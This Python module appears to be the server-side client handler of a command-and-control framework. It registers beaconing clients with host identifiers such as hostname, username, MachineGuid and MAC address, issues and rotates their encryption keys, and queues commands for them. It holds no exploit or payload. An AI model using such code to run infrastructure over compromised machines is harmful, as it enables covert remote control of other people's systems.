import os
import base64
import logging
from datetime import datetime
import json
import re
import uuid

logger = logging.getLogger(__name__)

class ClientHelper:
    """Handles client identification, verification, and command management"""
    
    def __init__(self, client_manager, crypto_helper, server):
        self.client_manager = client_manager
        self.crypto_helper = crypto_helper
        self.server = server
        self.encryption_service = getattr(server, 'encryption_service', None)
    
    def identify_client(self, client_ip, client_id=None, system_info_raw=None, is_first_contact=False):
        """
        Identify a client based on encryption key or client ID for first contact
        
        Args:
            client_ip: IP address of the client
            client_id: Client ID (only used for first contact)
            system_info_raw: Raw system info data (decrypted)
            is_first_contact: Whether this is the first contact from this client
            
        Returns:
            tuple: (client_id, system_info, newly_identified, first_contact)
        """
        system_info = {}
        newly_identified = False
        first_contact = is_first_contact
        
        # If a client_id is provided and exists in our database, prioritize that identification
        if client_id and client_id in self.client_manager.get_clients_info():
            logger.info(f"Client identified by provided ID: {client_id}")
            # This is a known client reconnecting, not first contact
            first_contact = False
        
        # Process system info if available
        if system_info_raw:
            try:
                # Parse the system info JSON
                if isinstance(system_info_raw, str):
                    system_info_obj = json.loads(system_info_raw)
                else:
                    system_info_obj = system_info_raw
                    
                # Extract properties from system info
                hostname = system_info_obj.get('Hostname', 'Unknown')
                ip = system_info_obj.get('IP', client_ip)
                system_info = system_info_obj
                
                logger.info(f"Extracted system info - Hostname: {hostname}, IP: {ip}")
                
            except Exception as e:
                logger.error(f"Error parsing system info: {str(e)}")
                # Use client_id but minimal system info
                system_info = {"Hostname": "Unknown", "IP": client_ip}
        else:
            # No system info provided, use minimal info
            system_info = {"Hostname": "Unknown", "IP": client_ip}
        
        # For first contact, we need to register the client with the ID provided by the server
        if is_first_contact:
            if not client_id:
                # Generate a client ID if none provided - but this should have been set by the beacon handler
                client_id = self._generate_client_id()
                
            # Check if this client already exists
            if client_id in self.client_manager.get_clients_info():
                logger.info(f"First contact from known client ID {client_id}")
            else:
                newly_identified = True
                logger.info(f"New client registration with ID {client_id}")
        
        # For established clients that we identified via decryption, just verify
        elif client_id and client_id in self.client_manager.get_clients_info():
            logger.info(f"Identified existing client {client_id} by client ID")
        else:
            # This is an anomaly - we either have:
            # 1. A client identified by decryption (no client_id)
            # 2. A client with a key but not registered in client_manager
            
            if client_id is None:
                # Generate a new ID for this client
                client_id = self._generate_client_id()
                newly_identified = True
                first_contact = True
                logger.warning(f"Created new client ID {client_id} for unidentified client")
            else:
                # We have a client ID but it's not in our database
                newly_identified = True
                first_contact = True
                logger.warning(f"Using provided client ID {client_id} for unrecognized client")
        
        # Register or update the client
        self.client_manager.add_client(
            ip=client_ip,
            hostname=system_info.get("Hostname", "Unknown"),
            username=system_info.get("Username", "Unknown"),
            machine_guid=system_info.get("MachineGuid", "Unknown"),
            os_version=system_info.get("OsVersion", "Unknown"),
            mac_address=system_info.get("MacAddress", "Unknown"),
            system_info=system_info,
            client_id=client_id
        )
        
        return client_id, system_info, newly_identified, first_contact
    
    def _generate_client_id(self):
        """Generate a unique client ID"""
        # Create a random UUID and take the first 8 characters
        random_id = str(uuid.uuid4())[:8]
        # Return a simple string ID
        return f"client_{random_id}"
    
    def verify_client(self, client_id, system_info):
        """
        Verify client identity
        
        Returns:
            tuple: (is_verified, confidence, needs_key_rotation, warnings)
        """
        # Key-based authentication is inherently verified
        is_verified = True
        confidence = 100.0  # High confidence since client was identified by its key
        warnings = []
        
        # Update client verification status
        self.client_manager.set_verification_status(client_id, is_verified, confidence, warnings)
        
        # Check if client needs key rotation
        has_unique_key = self._has_unique_key(client_id)
        
        # Check for manual key rotation request
        requested_key_rotation = any(
            cmd.get('command_type') == 'key_rotation' 
            for cmd in self.client_manager.get_pending_commands(client_id)
        )
        
        # Always issue a unique key on first connection
        needs_key_rotation = (not has_unique_key or requested_key_rotation)
        
        # Log key rotation status
        if requested_key_rotation:
            logger.info(f"Manual key rotation requested for client {client_id}")
        elif not has_unique_key:
            logger.info(f"First contact with client {client_id} - key issuance needed")
        
        # Register client information for future reference if client_verifier exists
        if hasattr(self.server, 'client_verifier') and self.server.client_verifier:
            self.server.client_verifier.register_client(client_id, system_info)
        
        return is_verified, confidence, needs_key_rotation, warnings
    
    def _has_unique_key(self, client_id):
        """Check if client has a unique encryption key"""
        # Check with encryption service if available
        if self.encryption_service:
            return self.encryption_service.has_client_key(client_id)
            
        # Fallback to client manager
        if hasattr(self.client_manager, 'has_unique_key'):
            return self.client_manager.has_unique_key(client_id)
            
        return False
    
    def prepare_key_issuance(self, client_id):
        """
        Prepare a key issuance for a new client
        
        Returns:
            dict: Key issuance command object
        """
        # Generate a new unique key for this client
        if self.encryption_service:
            new_key = self.encryption_service.generate_key()
            # Register the key with the encryption service
            self.encryption_service.set_client_key(client_id, new_key)
        else:
            # Fallback if no encryption service
            new_key = os.urandom(32)  # 256-bit key
            # Store in client manager
            self.client_manager.set_client_key(client_id, new_key)
            
        # Convert to base64 for transmission
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Create key issuance command
        key_issuance_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_issuance",
            "args": base64_key
        }
        
        logger.info(f"Key issuance command created for client {client_id}")
        
        return key_issuance_command
    
    def prepare_key_rotation(self, client_id):
        """
        Prepare a key rotation command for the client
        
        Returns:
            dict: Key rotation command object
        """
        # Generate a new unique key for this client
        if self.encryption_service:
            new_key = self.encryption_service.generate_key()
            # Register the key with the encryption service
            self.encryption_service.set_client_key(client_id, new_key)
        else:
            # Fallback if no encryption service
            new_key = os.urandom(32)  # 256-bit key
            # Store in client manager
            self.client_manager.set_client_key(client_id, new_key)
            
        # Convert to base64 for transmission
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Create key rotation command
        key_rotation_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_rotation",
            "args": base64_key
        }
        
        logger.info(f"Key rotation command issued for client {client_id}")
        
        return key_rotation_command
    
    def organize_commands(self, client_id, include_key_rotation=False, first_contact=False):
        """
        Organize commands for client including key rotation if needed
        
        Args:
            client_id: Client identifier
            include_key_rotation: Whether to include key rotation command
            first_contact: Whether this is the first contact from client
            
        Returns:
            tuple: (commands, has_key_operation)
        """
        commands = []
        has_key_operation = False
        
        # For first contact, only send a key issuance command
        if first_contact:
            key_issuance_command = self.prepare_key_issuance(client_id)
            commands.append(key_issuance_command)
            has_key_operation = True
            return commands, has_key_operation
        
        # Get pending commands for established clients
        commands = self.client_manager.get_pending_commands(client_id)
        
        # Move any key rotation commands to the front
        for i, command in enumerate(commands):
            if command.get('command_type') == 'key_rotation':
                has_key_operation = True
                if i > 0:  # Move to front if not already there
                    commands.insert(0, commands.pop(i))
                break
        
        # Add key rotation command if needed and not already present
        if include_key_rotation and not has_key_operation:
            key_rotation_command = self.prepare_key_rotation(client_id)
            commands.insert(0, key_rotation_command)
            has_key_operation = True
        
        return commands, has_key_operation
    
    def clear_commands_after_rotation(self, client_id):
        """Clear key rotation commands but keep other commands"""
        pending_commands = self.client_manager.get_pending_commands(client_id)
        non_rotation_commands = [cmd for cmd in pending_commands if cmd.get('command_type') != 'key_rotation']
        
        # Clear all commands then add back non-rotation ones
        self.client_manager.clear_pending_commands(client_id)
        
        for cmd in non_rotation_commands:
            self.client_manager.add_command(
                client_id, 
                cmd.get('command_type'), 
                cmd.get('args')
            )